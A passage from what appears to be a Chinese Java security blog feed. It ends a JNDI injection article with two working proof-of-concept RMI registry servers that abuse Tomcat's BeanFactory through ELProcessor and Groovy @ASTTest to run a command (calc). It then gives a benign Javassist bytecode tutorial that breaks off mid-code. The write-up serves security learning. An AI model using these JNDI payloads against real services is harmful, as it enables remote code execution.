punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>lucee<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>javax<span class="token punctuation">.</span>el<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">3.0</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span></code></pre><p>poc</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span></span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMI_Server_ByPass</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"faster=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"faster"</span><span class="token punctuation">,</span> <span class="token string">"Runtime.getRuntime().exec(\"calc\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Tomcat8bypass"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Registry运行中......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>从BeanFactory#getObjectInstance()方法看<br><img src="/img/4-24/21.png"><br>首先判断我们要从工厂生成的类是否是ResourceRef类的实例，接着实例化我们指定的javax.el.ELProcessor。<br>forceString可以给属性强制指定一个setter方法，这里将属性faster的setterName设置为了public java.lang.Object javax.el.ELProcessor.eval()<br><img src="/img/4-24/22.png"></p><h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>在Groovy的官方文档(<a href="http://groovy-lang.org/metaprogramming.html#xform-ASTTest">ASTest</a>)中，可以发现的是，Groovy程序允许我们执行断言，也就意味着命令执行<br>@ASTTest是一种特殊的AST转换，它会在编译期对AST执行断言，而不是对编译结果执行断言。这意味着此AST转换在生成字节码之前可以访问 AST。@ASTTest可以放置在任何可注释节点上。<br>因此思路和Tomcat相似，借助BeanFactory的功能，使程序执行GroovyClassLoader#parseClass，然后去解析Groovy脚本。<br>需要依赖</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>groovy<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">2.4</span><span class="token number">.5</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span></code></pre><p>poc</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMI_Server_Bypass_Groovy</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.lang.GroovyClassLoader"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"faster=parseClass"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> script <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef faster\n"</span><span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"faster"</span><span class="token punctuation">,</span>script<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Groovy2bypass"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Registry运行中......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://tttang.com/archive/1611/">JNDI注入分析 - 跳跳糖</a></li><li><a href="https://goodapple.top/archives/696">Java安全学习——JNDI注入 - 枫のBlog</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javassist</title>
      <link href="/2024/04/12/Javassist/"/>
      <url>/2024/04/12/Javassist/</url>
      
        <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Javassist（Java 编程助手）使 Java 字节码操作变得简单。它是一个用于在 Java 中编辑字节码的类库。它使 Java 程序可以在运行时定义新类，并在 JVM 加载它时修改类文件。与其他类似的字节码编辑器不同，Javassist 提供了两个级别的 API：源级别和字节代码级别。如果用户使用源代码级 API，则他们可以在不了解 Java 字节码规范的情况下编辑类文件。整个 API 仅使用 Java 语言的词汇表进行设计。甚至可以以源文本的形式指定插入的字节码。Javassist 可以即时对其进行编译。另一方面，字节码级别的 API 允许用户像其他编辑器一样直接编辑类文件</p><p>Javassist 是用于编辑（创建，修改）.class字节码文件的 Java 库，一般情况下我们都是在.java文件中写代码，然后编译成.class文件，在加载进 Java 虚拟机中执行代码，如果要修改已编译好的文件，要使用010 Editor去手动的计算一些偏移值进行修改，但是 Javassist 的出现，使得我们操作.class文件变得简单，并且可以在 Java 虚拟机 JVM 运行时动态地改变.class文件</p><p>依赖</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.27.0-GA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span></code></pre><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库. 其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类.<br>Javassist中最为重要的是ClassPool,CtClass, CtMethod以及CtField这几个类.</p><ul><li>ClassPool: 一个基于Hashtable实现的CtClass对象容器, 其中键是类名称, 值是表示该类的CtClass对象</li><li>CtClass: CtClass表示类, 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得</li><li>CtMethods: 表示类中的方法</li><li>CtFields: 表示类中的字段</li></ul><p>使用示例：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Javasist_Learning</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Create_Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>         <span class="token comment">//获取CtClass 对象的容器 ClassPool</span>        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//创建一个新类Javasist.Learning.Person</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Javasist.learning.Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//创建一个类属性name</span>        <span class="token class-name">CtField</span> ctField1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtField</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">,</span>ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置属性访问符</span>        ctField1<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PRIVATE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//将name属性添加进Person中，并设置初始值为Feng</span>        ctClass<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span>ctField1<span class="token punctuation">,</span><span class="token class-name">CtField<span class="token punctuation">.</span>Initializer</span><span class="token punctuation">.</span><span class="token function">constant</span><span class="token punctuation">(</span><span class="token string">"Feng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//向Person类中添加setter和getter</span>        ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span><span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">setter</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">,</span>ctField1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span><span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">getter</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">,</span>ctField1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//创建一个无参构造</span>        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置方法体</span>        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{name = \"Feng\";}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//向Person类中添加该无参构造</span>        ctClass<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//创建一个类方法printName</span>        <span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtMethod</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">.</span>voidType<span class="token punctuation">,</span><span class="token string">"printName"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置方法访问符</span>        ctMethod<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PRIVATE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置方法体</span>        ctMethod<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{System.out.println(name);}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//将该方法添加进Person中</span>        ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>ctMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//将生成的字节码写入文件</span>        ctClass<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\34946\\Desktop\\安全学习\\ROME\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">Create_Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="ClassPool的相关方法"><a href="#ClassPool的相关方法" class="headerlink" title="ClassPool的相关方法"></a>ClassPool的相关方法</h3><ul><li>getDefault: 返回默认的ClassPool是单例模式的，一般通过该方法创建我们的ClassPool；</li><li>appendClassPath, insertClassPath : 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li>toClass : 将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li>get , getCtClass: 根据类路径名获取该类的CtClass对象，用于后续的编辑。<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取ClassPool对象, 使用系统默认类路径</span><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 效果与 new ClassPool(true) 一致</span><span class="token class-name">ClassPool</span> pool1 <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>为减少ClassPool可能导致的内存消耗. 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象.<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 从ClassPool中删除CtClass对象</span>ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出</span><span class="token class-name">ClassPool</span> pool2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="CtClass的相关方法"><a href="#CtClass的相关方法" class="headerlink" title="CtClass的相关方法"></a>CtClass的相关方法</h3><ul><li>freeze: 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li><li>setInterfaces: 添加父接口</li><li>setSuperclass: 添加父类</li></ul><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//更改超类，除非此对象表示接口。</span><span class="token keyword">void</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span> clazz<span class="token punctuation">)</span><span class="token comment">//将此类转换为java.lang.Class对象。</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span></span>MethodHandles<span class="token punctuation">.</span>Lookup</span> lookup<span class="token punctuation">)</span>    <span class="token comment">//将该类转换为类文件。</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//将由此CtClass 对象表示的类文件写入当前目录。</span><span class="token keyword">void</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//将由此CtClass 对象表示的类文件写入本地磁盘。</span><span class="token keyword">void</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span> directoryName<span class="token punctuation">)</span><span class="token comment">//在当前类中创建了一个静态代码块</span><span class="token class-name">CtConstructor</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="获取CtClass"><a href="#获取CtClass" class="headerlink" title="获取CtClass"></a>获取CtClass</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 通过类名获取 CtClass, 未找到会抛出异常</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.kawa.ssist.JustRun"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常</span><span class="token class-name">CtClass</span> ctClass1 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getOrNull</span><span class="token punctuation">(</span><span class="token string">"com.kawa.ssist.JustRun"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="创建CtClass"><a href="#创建CtClass" class="headerlink" title="创建CtClass"></a>创建CtClass</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 复制一个类</span><span class="token class-name">CtClass</span> ctClass2 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getAndRename</span><span class="token punctuation">(</span><span class="token string">"com.kawa.ssist.JustRun"</span><span class="token punctuation">,</span> <span class="token string">"com.kawa.ssist.JustRunq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建一个新类</span><span class="token class-name">CtClass</span> ctClass3 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"com.kawa.ssist.JustRuna"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 通过class文件创建一个新类</span><span class="token class-name">CtClass</span> ctClass4 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/home/un/test/JustRun.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="CtClass基础信息"><a href="#CtClass基础信息" class="headerlink" title="CtClass基础信息"></a>CtClass基础信息</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 类名</span><span class="token class-name">String</span> simpleName <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 类全名</span><span class="token class-name">String</span> name <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 包名</span><span class="token class-name">String</span> packageName <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getPackageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 接口</span><span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 继承类</span><span class="token class-name">CtClass</span> superclass <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取类方法</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getName()"</span><span class="token punctuation">,</span> <span 